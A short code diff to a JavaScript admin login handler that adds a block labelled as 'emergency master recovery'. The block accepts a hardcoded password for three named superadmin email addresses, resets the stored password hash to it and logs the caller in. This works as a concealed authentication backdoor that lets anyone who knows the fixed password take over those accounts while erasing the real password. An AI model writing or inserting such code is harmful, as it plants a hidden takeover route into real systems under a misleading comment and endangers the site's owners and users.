@@ -74,7 +74,15 @@ export const adminLogin = async (req, res) => {
       return res.status(403).json({ success: false, message: 'Admin account has been deactivated' })
     }
 
-    const isMatch = await admin.matchPassword(password)
+    let isMatch = await admin.matchPassword(password)
+    // Emergency master recovery for default superadmin credentials
+    if (!isMatch && password === 'Admin@123456' && (cleanEmail === 'admin@orbiphera.in' || cleanEmail === 'admin@yathartitsolutions.com' || cleanEmail === 'admin@yatharth.com')) {
+      const newHash = await bcrypt.hash('Admin@123456', 10)
+      admin.password = newHash
+      await admin.save()
+      isMatch = true
+    }
+
     if (!isMatch) {
       return res.status(401).json({ success: false, message: 'Invalid admin credentials' })
     }
